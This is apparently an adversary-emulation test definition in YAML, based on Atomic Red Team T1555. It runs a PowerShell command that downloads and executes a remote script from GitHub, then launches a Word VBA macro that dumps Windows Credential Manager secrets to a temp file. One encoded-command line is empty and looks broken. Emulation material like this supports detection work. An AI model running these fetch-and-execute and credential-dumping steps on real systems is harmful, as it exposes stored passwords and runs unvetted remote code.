- id: 0433f498-7123-5380-9460-1bd862372223
  name: Soumaia ART Tests - Extract Windows Credential Manager via VBA
  description: 'This module will extract the credentials found within the Windows credential manager and dump

    them to $env:TEMP\windows-credentials.txt'
  tactic: credential-access
  technique:
    attack_id: T1555
    name: Credentials from Password Stores
  platforms:
    windows:
      psh:
        command: |-
          powershell -NoProfile -EncodedCommand 
          if ($LASTEXITCODE -ne 0) {
              powershell -NoProfile -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACIAWQBvAHUAIAB3AGkAbABsACAAbgBlAGUAZAAgAHQAbwAgAGkAbgBzAHQAYQBsAGwAIABNAGkAYwByAG8AcwBvAGYAdAAgAFcAbwByAGQAIABtAGEAbgB1AGEAbABsAHkAIAB0AG8AIABtAGUAZQB0ACAAdABoAGkAcwAgAHIAZQBxAHUAaQByAGUAbQBlAG4AdAAiAAoA
          }
          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
          Invoke-Maldoc -macroFile ".\T1555-macrocode.txt" -officeProduct "Word" -sub "Extract"
        cleanup: |-
          Remove-Item "$env:TEMP\windows-credentials.txt" -ErrorAction Ignore
        payloads:
        - T1555-macrocode.txt
